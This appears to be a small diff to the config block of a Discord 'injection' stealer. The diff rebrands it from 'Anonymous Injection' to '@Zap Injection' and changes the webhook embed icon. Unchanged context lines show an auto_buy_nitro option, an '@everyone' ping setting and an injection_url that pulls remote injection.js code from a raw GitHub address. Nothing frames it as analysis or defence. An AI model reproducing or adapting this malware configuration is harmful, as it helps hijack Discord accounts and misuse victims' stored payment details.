@@ -11,8 +11,8 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: false, 
   ping_val: '@everyone', 
-  embed_name: 'Anonymous Injection', 
-  embed_icon: 'https://cdn.discordapp.com/attachments/1076253206700634292/1078971098131087472/image.png', 
+  embed_name: '@Zap Injection', 
+  embed_icon: 'https://cdn.discordapp.com/attachments/1080884535669035068/1083401050033225758/image.png', 
   embed_color: 0000000, 
   injection_url: 'https://raw.githubusercontent.com/mishakabatedd/name/main/injection.js', 
 
